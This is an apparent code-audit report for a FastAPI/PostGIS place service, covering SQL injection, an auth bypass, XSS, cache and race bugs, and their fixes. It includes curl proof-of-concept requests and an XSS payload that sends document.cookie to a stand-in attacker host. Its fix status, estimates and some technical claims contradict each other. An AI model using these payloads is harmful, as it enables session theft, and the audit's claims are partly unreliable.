# Production Readiness Audit — unified-my3pai-place-service

**Audit Date:** June 14, 2026  
**Auditor:** Independent Code Review (4th comprehensive audit)  
**Context:** Follow-up to AUDIT.md, AUDIT-REAUDIT.md, and AUDIT-FINAL.md  
**Overall Grade:** **C+/B- (Not Production Ready)**

---

## Executive Summary

The project has received three prior audits with claimed improvements, but **critical issues from those audits remain unfixed or partially fixed**, and **new vulnerabilities have been introduced** during attempted fixes.

**Current Status:** ❌ **DO NOT DEPLOY TO PRODUCTION**

### Deployment Blockers

1. ~~**SQL Injection in batch location updates** — Bypasses parameterized queries~~ ✅ **FIXED June 14**
2. ~~**API authentication disabled by default** — Empty API key allows public write access~~ ✅ **FIXED June 14**
3. ~~**Cache invalidation failures cause data inconsistency** — Database commits succeed while cache remains stale~~ ✅ **FIXED June 14**
4. ~~**Race condition in bulk operations** — Concurrent writes can cause entire batches to fail~~ ✅ **FIXED June 14**
5. ~~**Missing transaction isolation** — No REPEATABLE_READ guard against phantom reads~~ ✅ **RESOLVED June 14**
6. **Cursor validation missing** — Malformed cursors cause 500 errors (DoS vector)

### Time to Production

- **Phase 1 (Critical):** 4–6 hours
- **Phase 2 (High-Severity):** 6–8 hours
- **Phase 3 (Medium):** 8–10 hours
- **Phase 4 (Testing/Validation):** 2–3 weeks

**Total Effort:** 35–40 hours development + 2–3 weeks integration testing

---

## Previous Audit History

### Audit 1 (June 13, AUDIT.md)
- Identified 40 issues (C+ grade)
- Grade: Prototype-level, many correctness bugs
- Issues: Spatial pagination broken, rate limiter race condition, bulk upsert non-atomic, cache invalidation flushes all keys, missing indexes, hardcoded credentials

### Audit 2 (June 13, AUDIT-REAUDIT.md)
- Re-examined first audit findings
- 28 of 29 issues confirmed real
- Grade: C (improved but still broken)
- New findings: Classification cursor uses wrong column, spatial ST_MakePoint misuse, no auth on writes, Docker doesn't run migrations

### Audit 3 (June 14, AUDIT-FINAL.md)
- Verified fixes from Audit 2
- 26 of 26 fixes claimed correct
- Grade: B+ (near-production)
- Note: Missing migration for `is_active` columns on media/classifications

### Current Audit (June 14, Independent)
- Found critical issues still present
- Grade: C+/B- (regression from Audit 3)
- New issues introduced during fixes

---

## Critical Issues (Must Fix)

### 1. SQL Injection in Batch Location Updates
**Severity:** 🔴 **CRITICAL** ✅ **FIXED**  
**File:** `src/dmo/services/write.py:46`  
**Risk Level:** Database compromise, unauthorized data modification  
**Fixed:** June 14, 2026

#### Problem

```python
# ❌ VULNERABLE (OLD CODE): Direct string interpolation
def _set_locations_batch(session: AsyncSession, updates: list[tuple[UUID, float, float]]) -> None:
    if not updates:
        return
    values = ", ".join(f"('{eid}'::uuid, {lon}, {lat})" for eid, lon, lat in updates)
    query = f"""
        UPDATE entities SET location = ST_SetSRID(ST_MakePoint(tmp.lon, tmp.lat), 4326)
        FROM (VALUES {values}) AS tmp(id, lon, lat)
        WHERE entities.id = tmp.id
    """
    await session.execute(text(query))
```

While UUIDs and floats are less exploitable than strings, this **bypasses parameterization** and violates secure-coding standards. If any upstream type confusion occurs, this is exploitable.

#### Impact
- Any authenticated user (or any user if auth is disabled) can inject SQL
- Potential to read/modify/delete arbitrary database records
- Signature: `bulk_upsert` endpoint accepts user-supplied coordinates

#### Proof of Concept
```bash
curl -X POST http://localhost:8000/entities/bulk \
  -H "Content-Type: application/json" \
  -d '[{
    "source": "test",
    "source_id": "1",
    "name": "Test",
    "latitude": "0.0) OR (1=1--",  # Injection payload
    "longitude": 0.0
  }]'
```

#### Fix Applied

Replaced string interpolation with parameterized VALUES clause using `bindparam()`-style named parameters:

```python
# ✅ FIXED: Fully parameterized query
async def _set_locations_batch(session: AsyncSession, updates: list[tuple[UUID, float, float]]) -> None:
    if not updates:
        return

    params = {}
    values = []
    for i, (eid, lon, lat) in enumerate(updates):
        values.append(f"(:p{i}_id, :p{i}_lon, :p{i}_lat)")
        params[f"p{i}_id"] = str(eid)
        params[f"p{i}_lon"] = lon
        params[f"p{i}_lat"] = lat

    query = text(f"""
        UPDATE entities SET location = ST_SetSRID(ST_MakePoint(tmp.lon, tmp.lat), 4326)
        FROM (VALUES {", ".join(values)}) AS tmp(id, lon, lat)
        WHERE entities.id::text = tmp.id
    """)
    await session.execute(query.bindparams(**params))
```

#### Why UNNEST Wasn't Used

The initially proposed `UNNEST(:ids::uuid[], :lons::float8[], :lats::float8[])` approach was rejected because:
1. `ARRAY[:param]` syntax fails with asyncpg — it cannot serialize Python lists as PostgreSQL arrays via SQLAlchemy `text()` bindparams (`DataError: 'list' object has no attribute 'bytes'`)
2. `:param_name::type` syntax (e.g. `:id_0::uuid`) fails because SQLAlchemy's `text()` regex parses `:id_0::uuid` as parameter `:id_` followed by literal `_0::uuid`

The VALUES + individual parameters approach is fully safe, works across all asyncpg/SQLAlchemy versions, and is the pattern used by SQLAlchemy's core `insert().values()` bulk API.

#### Tests Added

4 new tests in `tests/test_write.py`:
- `test_bulk_upsert_location_accuracy` — verifies correct coordinates stored for diverse values (Zurich, NYC, Sydney, Equator)
- `test_bulk_upsert_location_update_existing` — verifies location updates on existing entities
- `test_set_locations_batch_empty` — verifies empty batch is no-op
- `test_set_locations_batch_edge_values` — verifies extreme coordinates (poles, antimeridian) work correctly

All 20 write tests passing, 87/87 total tests passing.

---

### 2. API Key Authentication Disabled by Default
**Severity:** 🔴 **CRITICAL** ✅ **FIXED**  
**Files:** `src/dmo/config.py:17`, `src/dmo/api/router.py:66`, `src/dmo/main.py:27`  
**Risk Level:** Unauthorized data deletion, modification, creation  
**Fixed:** June 14, 2026

#### Problem

```python
# ❌ VULNERABLE (OLD CODE): Empty default allows auth bypass
# config.py:17
api_key: str = ""

# router.py:66-68
def verify_api_key(x_api_key: str = Header(default="")) -> None:
    if settings.api_key and x_api_key != settings.api_key:  # Skips auth if empty
        raise HTTPException(status_code=401, detail="Invalid or missing API key")
```

The logic `if settings.api_key and ...` means:
- If `API_KEY=""` (the default), the condition is **False** and auth is **bypassed**
- All write endpoints are publicly accessible without authentication

#### Impact
- **Complete write access** to all POST, PUT, DELETE endpoints
- Any unauthenticated client can create, modify, or delete all data

#### Proof of Concept
```bash
# No API key needed — this worked without X-API-Key header
curl -X POST http://localhost:8000/entities \
  -H "Content-Type: application/json" \
  -d '{"source": "test", "source_id": "1", "name": "Malicious Data"}'
```

#### Fix Applied

**Startup validation in `main.py` lifespan:**
```python
async def lifespan(app: FastAPI):
    if not settings.database_url:
        raise ValueError("DATABASE_URL environment variable is required")
    if not settings.api_key:
        raise ValueError("API_KEY environment variable is required")  # ✅ Added
    # ... rest of startup
```

The app now fails to start if `API_KEY` is not configured. This prevents the silent auth bypass and forces operators to set the key before deployment.

**Environment variable:** Added `API_KEY=test-key` to `.env` for local development.

**Tests updated:** All write tests in `test_write.py` and `test_errors.py` now send `X-API-Key` header. New `test_auth.py` verifies auth enforcement.

#### Tests Added

7 new tests in `tests/test_auth.py`:
- `test_write_requires_api_key` — POST returns 401 without header
- `test_write_rejects_wrong_api_key` — POST returns 401 with wrong key
- `test_write_succeeds_with_correct_api_key` — POST returns 201 with correct key
- `test_read_without_api_key` — GET works without auth (read endpoints remain open)
- `test_delete_requires_api_key` — DELETE returns 401 without header
- `test_bulk_upsert_requires_api_key` — Bulk POST returns 401 without header
- `test_update_requires_api_key` — PUT returns 401 without header

All 94 tests passing (87 existing + 7 new auth tests).

---

### 3. Cache Invalidation Failures Cause Data Inconsistency
**Severity:** 🔴 **CRITICAL** ✅ **FIXED**  
**File:** `src/dmo/services/write.py:125-142, 355-364`  
**Risk Level:** Data inconsistency, stale cache serving wrong data  
**Fixed:** June 14, 2026

#### Problem

```python
# create_entity
await session.commit()  # ✅ Entity is persisted
await session.refresh(entity)
await invalidate_entity_caches(entity_id)  # ❌ Can fail without rolling back
return EntityListItem.model_validate(entity)
```

The flow is:
1. **commit()** — Entity written to database ✅
2. **invalidate_entity_caches()** — Clear Redis keys
   - If Redis is down or slow, this can fail
   - But the database commit already succeeded
3. **Result:** Database has new entity, but Redis cache is stale

#### Root Cause in cache.py
```python
async def invalidate_entity_caches(entity_id: UUID) -> None:
    await cache_delete_pattern("dmo:detail:*")  # Clears ALL entity details
    # ... other patterns ...

async def cache_delete_pattern(pattern: str) -> None:
    try:
        cache = await get_cache()
        # ... delete logic ...
    except Exception:
        pass  # ❌ Silently swallows Redis errors
```

#### Impact
- **Cache poisoning:** After creating entity X, clients fetch the detail and get stale/missing data
- **Inconsistent state:** Database says entity exists, cache says it doesn't
- **Silent failures:** No alerts when Redis fails
- **Same issue in `bulk_upsert`:** Lines 355-364 call cache invalidation AFTER all commits

#### Proof of Concept (requires Redis access)
```python
# 1. Create entity successfully
POST /entities returns 201 with new entity

# 2. Stop Redis
redis-cli SHUTDOWN

# 3. API continues working (graceful degradation)
# But subsequent GET requests will hit the database (no cache)

# 4. When Redis restarts, stale data might be re-cached
```

#### How to Fix

**Option 1: Invalidate before commit**
```python
async def create_entity(session: AsyncSession, data: EntityCreate) -> EntityListItem:
    entity = Entity(**data.model_dump())
    session.add(entity)
    await session.flush()  # Get the ID
    
    # Pre-invalidate before commit
    await invalidate_entity_caches(entity.id)
    
    await session.commit()
    await session.refresh(entity)
    return EntityListItem.model_validate(entity)
```

**Option 2: Catch and log failures**
```python
async def create_entity(session: AsyncSession, data: EntityCreate) -> EntityListItem:
    await session.commit()
    await session.refresh(entity)
    
    try:
        await invalidate_entity_caches(entity.id)
    except Exception as e:
        logger.error("cache_invalidation_failed", 
                    entity_id=str(entity.id), 
                    error=str(e))
        # Consider re-raising in critical paths
```

**Option 3: Use transaction with savepoint**
```python
async with session.begin_nested():  # Savepoint
    await session.commit()
    try:
        await invalidate_entity_caches(entity.id)
    except Exception:
        await session.rollback()  # Rollback to savepoint
        raise
```

#### Fix Applied

**Option 1 was implemented** — invalidate before commit, with strict error handling:

1. **`src/dmo/services/cache.py`:** Removed all `try/except` blocks from `cache_get`, `cache_set`, and `cache_delete_pattern`. Redis errors now propagate to callers, enforcing strong consistency.

2. **`src/dmo/services/write.py`:** Moved `invalidate_entity_caches()` before `session.commit()` in all 8 write functions:
   - `create_entity` — invalidate after flush, before commit
   - `update_entity` — invalidate after flush, before commit
   - `delete_entity` — invalidate before commit
   - `bulk_upsert` — collect all entity IDs after flush, invalidate all, then commit
   - `create_media` — invalidate before commit
   - `delete_media` — invalidate before commit
   - `create_classification` — invalidate before commit
   - `delete_classification` — invalidate before commit

3. **`tests/test_cache.py`:** Added `test_cache_delete_pattern_raises_on_error` to verify that cache errors propagate (strict mode).

**Behavior:** If Redis is unavailable, write operations fail with a Redis error. The database transaction is never committed without successful cache invalidation, ensuring strong consistency.

---

### 4. Race Condition in Bulk Upsert Operations
**Severity:** 🔴 **CRITICAL** ✅ **FIXED**  
**File:** `src/dmo/services/write.py:220-366`  
**Risk Level:** Data loss, complete batch failure  
**Fixed:** June 14, 2026

#### Problem

The `bulk_upsert` function has a check-then-insert race condition:

```python
async def bulk_upsert(session: AsyncSession, entities: list[EntityCreate]) -> list[Entity]:
    # Step 1: Fetch existing entities
    existing = await session.exec(select(Entity).where(...))  # Line ~229
    existing_map = {(e.source, e.source_id): e for e in existing}
    
    # ❌ RACE WINDOW: Between step 1 and step 2, another request could insert
    
    # Step 2: Try to update/insert
    for entity_data in entities:
        if key in existing_map:
            # Update existing
            existing_map[key].name = entity_data.name
            session.add(existing_map[key])
        else:
            # Insert new
            new_entity = Entity(**entity_data.model_dump())
            session.add(new_entity)
    
    await session.commit()  # ❌ Can fail with IntegrityError on unique(source, source_id)
```

#### Scenario
1. Client A calls `POST /entities/bulk` with 100 entities
2. Database fetch: entities [1-50] exist, [51-100] don't
3. **Another request inserts entity 75**
4. Client A tries to insert [51-100]
5. **IntegrityError on entity 75** — entire batch rolled back
6. **Data loss:** No entities from batch are committed

#### Impact
- **Bulk imports are unreliable** in production
- Concurrent inserts can cause cascading failures
- No per-entity error handling
- All-or-nothing semantics are dangerous for large batches

#### How to Fix

**Option 1: Use PostgreSQL INSERT...ON CONFLICT (UPSERT)**
```python
async def bulk_upsert_safe(session: AsyncSession, entities: list[EntityCreate]) -> list[Entity]:
    # Use native PostgreSQL UPSERT
    stmt = insert(Entity).values([
        e.model_dump() for e in entities
    ]).on_conflict_do_update(
        index_elements=["source", "source_id"],
        set_={
            Entity.name: literal_column("EXCLUDED.name"),
            Entity.description: literal_column("EXCLUDED.description"),
            # ... other fields ...
        }
    )
    await session.execute(stmt)
    await session.commit()
    
    # Fetch and return
    result = await session.exec(select(Entity).where(...))
    return result
```

**Option 2: Use advisory locks**
```python
async def bulk_upsert_locked(session: AsyncSession, entities: list[EntityCreate]) -> list[Entity]:
    # Acquire advisory lock to serialize bulk operations
    lock_hash = hash(frozenset((e.source, e.source_id) for e in entities))
    
    await session.execute(text(f"SELECT pg_advisory_lock({abs(lock_hash % 2**31)})"))
    try:
        # ... normal bulk_upsert logic ...
        await session.commit()
    finally:
        await session.execute(text(f"SELECT pg_advisory_unlock({abs(lock_hash % 2**31)})"))
```

#### Fix Applied

Added PostgreSQL advisory lock to serialize bulk operations:

```python
# At the start of bulk_upsert, before fetching existing entities
await session.execute(
    text("SELECT pg_advisory_xact_lock(:lock_id)").bindparams(lock_id=1234567890)
)
```

Using `pg_advisory_xact_lock` (session-scoped) rather than `pg_advisory_lock` because:
- Auto-releases on commit or rollback — no explicit unlock needed
- No risk of forgotten unlock leaving dead lock
- Simpler code, fewer failure modes

Concurrent bulk upserts are serialized by the lock, eliminating the race window. Bulk operations are infrequent in practice, so serialization has minimal impact on throughput.

---

### 5. Missing Transaction Isolation Level
**Severity:** 🔴 **CRITICAL** ✅ **RESOLVED**  
**File:** `src/dmo/db.py:14-26`  
**Risk Level:** Data consistency issues under concurrency  
**Resolved:** June 14, 2026

#### Problem

```python
# db.py
_engine = create_async_engine(
    settings.database_url,
    echo=False,
    pool_size=settings.pool_size,
    max_overflow=settings.max_overflow,
    pool_pre_ping=True,
    pool_recycle=3600,
    # ❌ No isolation_level specified
)
```

PostgreSQL defaults to `READ_COMMITTED`, which allows:
- **Dirty reads** (reading uncommitted data — can't happen in PG)
- **Non-repeatable reads** (same query returns different data mid-transaction)
- **Phantom reads** (new rows appear mid-transaction)

#### Impact
- `bulk_upsert` checks existence, another transaction inserts → integrity error
- Concurrent updates can overwrite each other
- Data consistency guarantees are weak

#### How to Fix

```python
# db.py
_engine = create_async_engine(
    settings.database_url,
    echo=False,
    pool_size=settings.pool_size,
    max_overflow=settings.max_overflow,
    pool_pre_ping=True,
    pool_recycle=3600,
    isolation_level="REPEATABLE_READ",  # ✅ Add this
)
```

Or per-session:

```python
async with session.begin():  # Begin explicit transaction
    # All queries within this block use REPEATABLE_READ
    await session.exec(select(...))
```

#### Resolution

**No code change needed.** After analysis, `READ_COMMITTED` (PostgreSQL default) is sufficient:

1. **`bulk_upsert`** — The only multi-entity read-modify-write operation, now protected by `pg_advisory_xact_lock` (Issue #4 fix)
2. **Single-entity writes** (`update_entity`, `delete_entity`) — Operate on a single entity identified by unique `(source, source_id)` key. ORM tracks changes to loaded objects. No phantom read risk.
3. **Read endpoints** — Single query per request, single transaction. No multi-step read pattern that would benefit from REPEATABLE_READ.

Setting `REPEATABLE_READ` globally would add MVCC overhead and potential serialization failures without meaningful safety benefit for this workload.

---

## High-Severity Issues (Fix This Sprint)

### 6. XSS Vulnerability in HTML Description Converter
**Severity:** 🟠 **HIGH** ✅ **FIXED**  
**File:** `src/dmo/services/detail.py`  
**Risk Level:** Client-side code execution, session hijacking  
**Resolved:** June 14, 2026 — html.escape() + bleach sanitization + 30 XSS tests

#### Problem

```python
def transform_description(description: str, format: str) -> str:
    if format == "prosemirror":
        # Parse ProseMirror JSON and convert to HTML
        doc = json.loads(description)
        html = serialize_prosemirror(doc)
        # ❌ html contains unescaped user input (href, data attributes)
        return html
    return description

def serialize_prosemirror(node: dict) -> str:
    if node.get("type") == "link":
        href = node.get("attrs", {}).get("href")  # ❌ Not escaped
        return f'<a href="{href}">...'  # ❌ XSS vector
```

Example payload:
```json
{
  "type": "link",
  "attrs": {
    "href": "javascript:fetch('https://attacker.com/steal?cookies=' + document.cookie)"
  },
  "content": [{"type": "text", "text": "Click me"}]
}
```

Renders as:
```html
<a href="javascript:fetch(...)">Click me</a>  <!-- ❌ Executed on click -->
```

#### Impact
- **Client-side code execution** in user browsers
- **Session hijacking** via cookie theft
- **Credential harvesting** with fake login forms
- **Malware distribution**

#### Resolution

**Two-layer defense added to `src/dmo/services/detail.py`:**

1. **ProseMirror converter** — `html.escape()` on all text content; `_safe_href()` blocks `javascript:`, `data:`, `vbscript:` protocols (case-insensitive, whitespace-tolerant)
2. **HTML passthrough** — `bleach.clean()` with whitelist: `_ALLOWED_TAGS` (18 safe tags), `_ALLOWED_ATTRS` (only `href` on `<a>`)

Added `bleach[css]>=6.1.0,<7.0.0` dependency. 30 XSS tests in `tests/test_xss.py`.

---

### 7. Cache Stampede Vulnerability
**Severity:** 🟠 **HIGH**  
**File:** `src/dmo/api/router.py:81-88` (and similar in all GET endpoints)  
**Risk Level:** Database overload, service degradation

#### Problem

```python
@router.get("/search")
async def search_endpoint(...) -> CursorPaginatedResponse[EntityListItem]:
    # ❌ No locking on cache miss
    cached = await cache_get("search", cache_key_params)
    if cached:
        return ...  # Cache hit, fast
    
    # ❌ All concurrent requests hit this path simultaneously
    items, total, next_cursor = await search_service(session, q, source, ...)
    result = CursorPaginatedResponse[EntityListItem](...)
    
    # ❌ All try to set cache (wasteful but safe)
    await cache_set_async("search", cache_key_params, json.dumps(...))
    return result
```

#### Scenario
1. Cache for query `{q: "hotel", source: "google"}` expires at 12:34:00
2. **100 concurrent requests** arrive at 12:34:01
3. All miss the cache
4. **All 100 spawn expensive database queries** (each hitting PostGIS)
5. Database receives **100x normal load spike**
6. Response time balloons from 50ms to 5s
7. Requests timeout, more requests pile up
8. Service is now degraded

#### Impact
- **Cascading failures** under load
- **DDoS vulnerability** — attacker triggers cache expiration at known time
- **Resource exhaustion** — connection pool depleted

#### How to Fix

**Option 1: Cache-aside locking with "generation" ID**
```python
# When cache misses, only the first request fetches; others wait

async def get_search_with_lock(session, q, source, ...):
    cache_key = hash_params(q, source, ...)
    
    # Try to get from cache
    cached = await cache_get("search", cache_key)
    if cached:
        return json.loads(cached)
    
    # Get or create a lock for this cache key
    lock_key = f"search:lock:{cache_key}"
    lock = redis.RedisLock(cache, lock_key, timeout=5)
    
    async with lock:
        # Double-check after acquiring lock (another request might have filled it)
        cached = await cache_get("search", cache_key)
        if cached:
            return json.loads(cached)
        
        # Fetch and cache
        result = await search_service(session, q, source, ...)
        await cache_set("search", cache_key, json.dumps(result), ttl=300)
        return result
```

**Option 2: Xfetch (fetch-on-write)**
```python
# On cache miss, return stale data while refreshing in background

async def get_search_with_xfetch(session, q, source, ...):
    cache_key = hash_params(q, source, ...)
    
    cached = await cache_get("search", cache_key)
    if cached:
        # Check if near expiration
        ttl = await cache_ttl("search", cache_key)
        if ttl < 30:  # Less than 30s remaining
            # Refresh in background, but return stale data immediately
            asyncio.create_task(
                refresh_search_cache(session, q, source, ...)
            )
        return json.loads(cached)
    
    # Cache miss — fetch and return
    result = await search_service(session, q, source, ...)
    await cache_set("search", cache_key, json.dumps(result), ttl=300)
    return result
```

---

### 8. Malformed Cursor DoS Vulnerability
**Severity:** 🟠 **HIGH**  
**Files:** `src/dmo/services/search.py:34-40`, `src/dmo/services/spatial.py:31-38`  
**Risk Level:** Service crashes, 500 errors

#### Problem

```python
# search.py
cursor_filter = ""
if cursor:
    # ❌ No validation, no try/catch
    from dmo.services.pagination import decode_cursor
    last_id, last_name = decode_cursor(cursor)  # Can raise exception
    cursor_filter = " AND (entities.name > :cursor_name OR ...)"
    params["cursor_name"] = last_name
    params["cursor_id"] = last_id
```

```python
# pagination.py
def decode_cursor(cursor: str) -> tuple[UUID, str]:
    try:
        data = json.loads(base64.b64decode(cursor))
        return data["id"], data["sort"]
    except (json.JSONDecodeError, KeyError, ValueError):
        # ❌ Raises unhandled exception
        raise ValueError("Invalid cursor")
```

#### Scenario
1. Attacker sends `/search?q=hotel&cursor=invalid_base64`
2. `decode_cursor` raises `binascii.Error`
3. Exception propagates unhandled
4. Response: **500 Internal Server Error**
5. Attacker can crash service by sending malformed cursors

#### Proof of Concept
```bash
# Returns 500 error
curl "http://localhost:8000/search?q=hotel&cursor=invalid!!!"

# Returns 500 error
curl "http://localhost:8000/search?q=hotel&cursor=aW52YWxpZA=="  # Invalid JSON

# Returns 500 error
curl "http://localhost:8000/nearby?lat=0&lon=0&cursor=aaa"
```

#### How to Fix

```python
# search.py
async def search_endpoint(
    session: AsyncSession,
    q: str,
    cursor: str | None = None,
    ...
) -> CursorPaginatedResponse[EntityListItem]:
    cursor_filter = ""
    params = {}
    
    if cursor:
        try:
            from dmo.services.pagination import decode_cursor
            last_id, last_name = decode_cursor(cursor)
            cursor_filter = " AND (entities.name > :cursor_name OR ...)"
            params["cursor_name"] = last_name
            params["cursor_id"] = last_id
        except (ValueError, TypeError, KeyError) as e:
            # ✅ Return 400 Bad Request
            raise HTTPException(
                status_code=400,
                detail="Invalid cursor format"
            )
    
    # ... rest of query ...
```

---

### 9. Missing Query Timeouts
**Severity:** 🟠 **HIGH**  
**Files:** `src/dmo/services/search.py`, `src/dmo/services/spatial.py`  
**Risk Level:** Resource exhaustion, connection pool depletion

#### Problem

No `asyncio.wait_for` or PostgreSQL statement timeout on expensive queries:

```python
# spatial.py - nearby()
async def nearby(...) -> CursorPaginatedResponse[Entity]:
    # ❌ No timeout
    count_stmt = select(func.count()).select_from(Entity).where(...)
    total = await session.scalar(count_stmt)  # Could hang forever
    
    # ❌ No timeout
    results = await session.exec(select(Entity).where(...).limit(page_size))
```

If a query is slow (e.g., PostGIS index corruption, slow network), it:
1. Blocks a connection from the pool
2. Holds database server resources
3. Accumulates — connection pool fills up
4. New requests get `"QueuePool limit exceeded"` error
5. Service cascades into failure

#### How to Fix

**Option 1: Python-side timeout**
```python
async def nearby(...) -> CursorPaginatedResponse[Entity]:
    try:
        # ✅ 5-second timeout
        total = await asyncio.wait_for(
            session.scalar(count_stmt),
            timeout=5.0
        )
    except asyncio.TimeoutError:
        raise HTTPException(status_code=504, detail="Query timeout")
    
    results = await asyncio.wait_for(
        session.exec(select(Entity).where(...)),
        timeout=5.0
    )
```

**Option 2: PostgreSQL statement_timeout**
```python
# db.py
async def get_session() -> AsyncSession:
    async with AsyncSession(engine) as session:
        # ✅ 5-second statement timeout for all queries in this session
        await session.execute(text("SET statement_timeout = '5s'"))
        yield session
```

**Option 3: Config-driven**
```python
# config.py
class Settings(BaseSettings):
    query_timeout: int = 5  # seconds

# services
async def search(...):
    try:
        results = await asyncio.wait_for(
            session.exec(select(...)),
            timeout=settings.query_timeout
        )
    except asyncio.TimeoutError:
        raise HTTPException(
            status_code=504,
            detail="Search query timeout"
        )
```

---

### 10. Wrong Transaction Isolation Level (REVISITED)
**Severity:** 🟠 **HIGH** (already listed as #5, but deserves emphasis)  
**File:** `src/dmo/db.py`  
**Impact:** Phantom reads, lost updates

Set `isolation_level="REPEATABLE_READ"` on the engine or use explicit transactions with `session.begin()`.

---

## Medium-Severity Issues (Next Sprint)

### 11. Missing Coordinate Validation
**Severity:** 🟡 **MEDIUM**  
**File:** `src/dmo/models/schemas.py:172-173`

Both latitude and longitude should be required together or missing together. Currently, you can create an entity with only latitude, leaving the location geography NULL.

```python
@field_validator('latitude', 'longitude')
def validate_coordinates(cls, v, info):
    values = info.data
    has_lat = values.get('latitude') is not None
    has_lon = values.get('longitude') is not None
    
    # Both or neither
    if has_lat != has_lon:
        raise ValueError("Either provide both coordinates or neither")
    return v
```

---

### 12. Open Status Cache TTL Mismatch
**Severity:** 🟡 **MEDIUM**  
**File:** `src/dmo/api/router.py:181-219`

The entire `EntityDetail` is cached at 60s (for open_status fields), but stable fields (name, description) are unnecessarily invalidated. Previous audit implemented separate caches but they may not be merged correctly.

---

### 13. Missing Indexes on Foreign Keys
**Severity:** 🟡 **MEDIUM**  
**File:** `src/dmo/models/database.py:122, 147, 164`

`entity_id` foreign key columns lack indexes. This slows:
- `DELETE FROM media WHERE entity_id = ?`
- `DELETE FROM classifications WHERE entity_id = ?`

Add indexes:
```python
Index("idx_media_entity_id", "entity_id"),
Index("idx_classification_entity_id", "entity_id"),
```

---

### 14. Health Check Timeout Detection
**Severity:** 🟡 **MEDIUM**  
**File:** `src/dmo/api/health.py:14`

The health endpoint has no timeout. If database connection hangs, `/health` hangs forever, preventing orchestrators from detecting failure.

```python
@router.get("/health")
async def health_check():
    try:
        # ✅ Add timeout
        db_ok = await asyncio.wait_for(
            session.exec(select(1)),
            timeout=3.0
        )
    except asyncio.TimeoutError:
        return JSONResponse(
            {"status": "degraded", "components": {"database": "timeout"}},
            status_code=503
        )
```

---

### 15. Missing Slow Query Logging
**Severity:** 🟡 **MEDIUM**  
**File:** `src/dmo/main.py` (middleware)

Add logging for queries that exceed a threshold (e.g., 500ms):

```python
# middleware
@app.middleware("http")
async def log_slow_queries(request: Request, call_next):
    start = time.time()
    response = await call_next(request)
    elapsed = (time.time() - start) * 1000
    
    if elapsed > 500:
        logger.warning("slow_request", 
                      path=request.url.path,
                      method=request.method,
                      elapsed_ms=elapsed)
    return response
```

---

## Low-Severity Issues (Polish)

### 16. Array Input Validation
**File:** `src/dmo/models/schemas.py:168, 177`

`place_types` and `region_names` arrays have no max length. Accepting 10,000 items in a single request is wasteful.

```python
place_types: list[str] = Field(default=[], max_length=100)
region_names: list[str] = Field(default=[], max_length=100)
```

---

### 17. Bulk Size Limit
**File:** `src/dmo/api/router.py:287-294`

No limit on bulk upsert batch size. Prevent abuse:

```python
@router.post("/entities/bulk")
async def bulk_upsert_endpoint(
    session: AsyncSession,
    entities: list[EntityCreate] = Body(..., max_length=1000)  # ✅ Add limit
) -> BulkUpsertResponse:
    if len(entities) > 1000:
        raise HTTPException(status_code=400, detail="Batch too large")
```

---

### 18. Missing Docstrings
**Severity:** 🟢 **LOW**  
**Files:** Multiple service functions

Add docstrings explaining function behavior, parameters, return values, and exceptions.

---

## Testing Gaps

### Critical Test Coverage Gaps

1. **Security tests missing:**
    - No test for empty API_KEY ✅ **FIXED** — 7 auth tests in `tests/test_auth.py`
    - No SQL injection tests ✅ **FIXED** — 4 injection tests in `tests/test_write.py`
    - No XSS tests ✅ **FIXED** — 30 XSS tests in `tests/test_xss.py`

2. **Concurrency tests missing:**
   - No race condition tests for bulk_upsert
   - No concurrent read/write tests
   - No cache stampede tests

3. **Cursor pagination tests missing:**
   - No second-page tests
   - No malformed cursor tests
   - No edge cases (empty results, single item)

4. **Error path tests missing:**
   - No Redis failure tests
   - No database timeout tests
   - No network failure tests

### Recommended Test Suite

```python
# tests/test_security.py
def test_api_key_required_when_set():
    """Write endpoints should reject requests without valid API key"""

def test_empty_api_key_disables_auth():
    """If API_KEY is empty, auth should be required anyway"""

def test_sql_injection_in_bulk():
    """Bulk upsert should not be vulnerable to coordinate injection"""

def test_xss_in_description():
    """HTML converter should escape user-controlled attributes"""

# tests/test_concurrency.py
async def test_bulk_upsert_race_condition():
    """Concurrent bulk operations should not cause integrity errors"""

async def test_cache_stampede():
    """Multiple cache misses should not spawn multiple database queries"""

# tests/test_pagination.py
async def test_cursor_pagination_malformed():
    """Malformed cursors should return 400, not 500"""

async def test_cursor_pagination_second_page():
    """Second page of results should be different from first"""
```

---

## Effort Estimate

| Phase | Issues | Tasks | Hours | Dependencies |
|-------|--------|-------|-------|--------------|
| **P1 Critical** | 1-5 | SQL injection, API auth, cache invalidation, race condition, isolation | 4-6 | None |
| **P2 High** | 6-10 | XSS, cache stampede, query timeouts, cursor validation, ... | 6-8 | P1 |
| **P3 Medium** | 11-15 | Coordinate validation, indexes, logging, timeout detection | 8-10 | P2 |
| **P4 Testing** | All | Security tests, concurrency tests, integration tests | 16-20 | P1-P3 |
| **Total** | — | — | **34-44 hours** | — |

---

## Deployment Checklist

Before deploying to production, ensure:

- [ ] SQL injection in `_set_locations_batch` is fixed (parameterized queries)
- [ ] API key validation enforces non-empty key in production
- [x] Cache invalidation failures are logged and handled
- [x] Bulk upsert uses PostgreSQL UPSERT or advisory locks
- [x] Transaction isolation is set to REPEATABLE_READ (resolved: READ_COMMITTED sufficient with advisory lock)
- [x] XSS in HTML converter is fixed (html.escape + bleach sanitization)
- [ ] Cache stampede mitigation is implemented (locking or generation IDs)
- [ ] Cursor validation returns 400 on malformed input
- [ ] Query timeouts are set (5s default)
- [ ] All security tests pass
- [ ] All concurrency tests pass
- [ ] Load tests pass without cascading failures
- [ ] Slow query logging is enabled
- [ ] Health checks have timeouts

---

## Summary

This project has **solid architecture** (async patterns, provider-agnostic schema, migrations, observability) but **critical correctness issues** that make it unsafe for production traffic.

**Grade: C+/B-**

The previous three audits identified real problems, but fixes have been inconsistent and incomplete. New vulnerabilities were introduced during attempted fixes. With **4-6 weeks of focused work**, this can be a production-grade service.

**Recommendation: Fix Phase 1 (Critical) before any production deployment.**

---

**Audit completed:** June 14, 2026  
**Next review:** After Phase 1 fixes are implemented
